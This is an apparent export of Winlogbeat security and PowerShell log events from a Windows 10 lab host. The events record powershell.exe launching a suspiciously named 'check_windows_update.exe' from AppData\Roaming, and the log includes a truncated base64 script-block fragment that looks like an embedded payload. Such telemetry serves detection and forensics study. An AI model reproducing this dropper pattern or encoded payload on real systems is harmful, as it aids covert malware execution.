        {
          "_index": "winlogbeat-9.1.2",
          "_id": "r07xDJoBUQc08OI1jwMa",
          "_score": null,
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "verbose"
            },
            "event": {
              "created": "2025-10-22T17:22:21.892Z",
              "action": "Stopping Command",
              "kind": "event",
              "code": "4106",
              "provider": "Microsoft-Windows-PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362",
              "type": "winlogbeat"
            },
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4106",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Stopping Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "record_id": 8587,
              "version": 1,
              "activity_id": "{5C6CA50B-4378-0000-50AA-6C5C7843DC01}",
              "event_data": {
                "ScriptBlockId": "762386e7-3525-401b-8244-75e1804fed59",
                "RunspaceId": "5bd0b77f-0264-4119-b083-e1a3cc5e4129"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "architecture": "x86_64",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.444Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.444Z",
            125
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "rk7xDJoBUQc08OI1jwMa",
          "_score": null,
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4104",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Execute a Remote Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "record_id": 8585,
              "version": 1,
              "activity_id": "{5C6CA50B-4378-0000-4EAA-6C5C7843DC01}",
              "event_data": {
                "ScriptBlockId": "762386e7-3525-401b-8244-75e1804fed59",
                "MessageTotal": "1",
                "MessageNumber": "1",
                "ScriptBlockText": "$global:?"
              }
            },
            "event": {
              "created": "2025-10-22T17:22:21.892Z",
              "provider": "Microsoft-Windows-PowerShell",
              "kind": "event",
              "code": "4104",
              "action": "Execute a Remote Command"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "verbose"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.443Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.443Z",
            124
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "hU7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4105",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Starting Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "version": 1,
              "activity_id": "{5C6CA50B-4378-0000-4EAA-6C5C7843DC01}",
              "record_id": 8586,
              "event_data": {
                "ScriptBlockId": "762386e7-3525-401b-8244-75e1804fed59",
                "RunspaceId": "5bd0b77f-0264-4119-b083-e1a3cc5e4129"
              }
            },
            "event": {
              "action": "Starting Command",
              "created": "2025-10-22T17:22:21.892Z",
              "kind": "event",
              "code": "4105",
              "provider": "Microsoft-Windows-PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "verbose"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "platform": "windows",
                "build": "19045.6456",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.443Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.443Z",
            108
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "gU7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "information"
            },
            "event": {
              "created": "2025-10-22T17:22:21.685Z",
              "provider": "Microsoft-Windows-Security-Auditing",
              "kind": "event",
              "code": "4688",
              "outcome": "success",
              "action": "Process Creation"
            },
            "winlog": {
              "event_id": "4688",
              "process": {
                "thread": {
                  "id": 5924
                },
                "pid": 4
              },
              "opcode": "Info",
              "task": "Process Creation",
              "provider_name": "Microsoft-Windows-Security-Auditing",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
              "channel": "Security",
              "record_id": 77686,
              "version": 2,
              "keywords": [
                "Audit Success"
              ],
              "event_data": {
                "SubjectLogonId": "0x28f38",
                "TokenElevationType": "TokenElevationTypeLimited (3)",
                "ParentProcessName": """C:\Users\konoha\AppData\Roaming\check_windows_update.exe""",
                "SubjectDomainName": "DESKTOP-48ASLS3",
                "TargetLogonId": "0x0",
                "NewProcessName": """C:\Windows\System32\conhost.exe""",
                "TargetUserSid": "S-1-0-0",
                "TargetUserName": "-",
                "SubjectUserSid": "S-1-5-21-2565546577-2149564376-132263907-1000",
                "ProcessId": "0x20f4",
                "SubjectUserName": "konoha",
                "MandatoryLabel": "S-1-16-8192",
                "NewProcessId": "0x20fc",
                "TargetDomainName": "-"
              }
            },
            "agent": {
              "version": "9.1.2",
              "name": "DESKTOP-48ASLS3",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "architecture": "x86_64",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.427Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.427Z",
            104
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "hE7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "verbose"
            },
            "event": {
              "created": "2025-10-22T17:22:21.892Z",
              "action": "Stopping Command",
              "kind": "event",
              "code": "4106",
              "provider": "Microsoft-Windows-PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4106",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Stopping Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "version": 1,
              "activity_id": "{5C6CA50B-4378-0000-B8A9-6C5C7843DC01}",
              "record_id": 8584,
              "event_data": {
                "ScriptBlockId": "8dfb2248-d987-43fa-8ad4-de2bac625f96",
                "RunspaceId": "5bd0b77f-0264-4119-b083-e1a3cc5e4129"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.421Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.421Z",
            107
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "qk7xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "event_id": "4688",
              "process": {
                "thread": {
                  "id": 5924
                },
                "pid": 4
              },
              "opcode": "Info",
              "task": "Process Creation",
              "provider_name": "Microsoft-Windows-Security-Auditing",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
              "keywords": [
                "Audit Success"
              ],
              "version": 2,
              "channel": "Security",
              "record_id": 77685,
              "event_data": {
                "TargetDomainName": "-",
                "TokenElevationType": "TokenElevationTypeLimited (3)",
                "ParentProcessName": """C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""",
                "SubjectDomainName": "DESKTOP-48ASLS3",
                "NewProcessName": """C:\Users\konoha\AppData\Roaming\check_windows_update.exe""",
                "TargetLogonId": "0x0",
                "TargetUserSid": "S-1-0-0",
                "TargetUserName": "-",
                "SubjectUserSid": "S-1-5-21-2565546577-2149564376-132263907-1000",
                "ProcessId": "0x2044",
                "MandatoryLabel": "S-1-16-8192",
                "SubjectUserName": "konoha",
                "SubjectLogonId": "0x28f38",
                "NewProcessId": "0x20f4"
              }
            },
            "event": {
              "action": "Process Creation",
              "created": "2025-10-22T17:22:21.685Z",
              "kind": "event",
              "code": "4688",
              "outcome": "success",
              "provider": "Microsoft-Windows-Security-Auditing"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "information"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.418Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.418Z",
            120
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "qU7xDJoBUQc08OI1jwMa",
          "_score": null,
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "verbose"
            },
            "event": {
              "action": "Starting Command",
              "created": "2025-10-22T17:22:20.889Z",
              "kind": "event",
              "code": "4105",
              "provider": "Microsoft-Windows-PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4105",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Starting Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "record_id": 8582,
              "activity_id": "{5C6CA50B-4378-0000-7BA9-6C5C7843DC01}",
              "version": 1,
              "event_data": {
                "ScriptBlockId": "d604dea0-d406-4c05-a99d-97b447ba2fb5",
                "RunspaceId": "5bd0b77f-0264-4119-b083-e1a3cc5e4129"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "architecture": "x86_64",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.236Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.236Z",
            119
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "gE7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "verbose"
            },
            "event": {
              "created": "2025-10-22T17:22:20.889Z",
              "action": "Stopping Command",
              "kind": "event",
              "code": "4106",
              "provider": "Microsoft-Windows-PowerShell"
            },
            "agent": {
              "version": "9.1.2",
              "name": "DESKTOP-48ASLS3",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362",
              "type": "winlogbeat"
            },
            "winlog": {
              "user": {
                "name": "konoha",
                "type": "User",
                "domain": "DESKTOP-48ASLS3",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4106",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Stopping Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "version": 1,
              "activity_id": "{5C6CA50B-4378-0000-7BA9-6C5C7843DC01}",
              "record_id": 8583,
              "event_data": {
                "ScriptBlockId": "d604dea0-d406-4c05-a99d-97b447ba2fb5",
                "RunspaceId": "5bd0b77f-0264-4119-b083-e1a3cc5e4129"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "architecture": "x86_64",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:20.236Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:20.236Z",
            103
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "o07xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword",
            "winlog.event_data.ScriptBlockText.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "user": {
                "name": "konoha",
                "domain": "DESKTOP-48ASLS3",
                "type": "User",
                "identifier": "S-1-5-21-2565546577-2149564376-132263907-1000"
              },
              "event_id": "4104",
              "process": {
                "thread": {
                  "id": 8428
                },
                "pid": 8260
              },
              "opcode": "On create calls",
              "task": "Execute a Remote Command",
              "provider_name": "Microsoft-Windows-PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "version": 1,
              "activity_id": "{5C6CA50B-4378-0002-3FAA-6C5C7843DC01}",
              "record_id": 8570,
              "event_data": {
                "ScriptBlockId": "8dfb2248-d987-43fa-8ad4-de2bac625f96",
                "MessageTotal": "31",
                "ScriptBlockText": "AAAAKAAAAYBwDAAAAAAAAAAAAkBwDALAcAwAQHQMAYB0DAGAeAwCAHgMAoB4DAGAdAwBgHgMAgB4DAAAAAAAAAAAAAEMEAAkAAAAAAAAA/////wAAAABAAAAASBwDAAAAAABgQwQACAAAAAAAAAD/////AAAAAEAAAADQHAMAAAAAAAAAAAADAAAACQAAAOAcAwCwHAMAEB0DAGAdAwBgHgMAgB4DAKAeAwBgHQMAYB4DAIAeAwAAAAAAAAAAAAAAAACwQwQAAwAAAAAAAAD/////AAAAAEAAAAAwHQMAAAAAAAAAAAAAAAAABAAAAEAdAwAQHQMAYB0DAGAeAwCAHgMAAAAAAAAAAAAAAAAAAAAAAABEBAACAAAAAAAAAAAAAAAEAAAAUAAAAIAdAwAAAAAAAAAAAAAAAAADAAAAkB0DAKAdAwDAHQMAAB4DAAAAAAAARAQAAgAAAAAAAAD/////AAAAAEAAAACAHQMAAAAAAEBEBAABAAAAAAAAAP////8AAAAAQAAAAOAdAwAAAAAAAAAAAAAAAAACAAAA8B0DAMAdAwAAHgMAAAAAAAAAAABwRAQAAAAAAAgAAAD/////AAAAAEAAAAAgHgMAAAAAAAAAAAAAAAAAAQAAADAeAwBAHgMAAAAAAAAAAAAAAAAAcEQEAAAAAAAAAAAA/////wAAAABAAAAAIB4DAAAAAABARAQAAQAAAAAAAAAAAAAABAAAAEAAAADgHQMAAAAAAHBEBAAAAAAACAAAAAAAAAAEAAAAQAAAACAeAwAAAAAAoEQEAAMAAAAQAAAA/////wAAAABAAAAAwB4DAAAAAAAAAAAAAAAAAAQAAADQHgMA8B4DAGAdAwBgHgMAgB4DAAAAAAAAAAAAAAAAAAAAAACgRAQAAwAAAAAAAAD/////AAAAAEAAAADAHgMAAAAAAJAfA0ABAAAAMI4AQAEAAACQLQBAAQAAAJAtAEABAAAAgI4AQAEAAACwkQBAAQAAAMCSAEABAAAA0JIAQAEAAAAwlABAAQAAAJCUAEABAAAAwJUAQAEAAADwlgBAAQAAAKCaAEABAAAAIDIAQAEAAADAkgBAAQAAAPBFAEABAAAAAQAAAAAAAAAAAAAA8EQEAKgfAwCQHwMAAAAAAAAAAAACAAAAuB8DANAfAwDwHwMAAAAAAAAAAAAAAAAAAAAAAPB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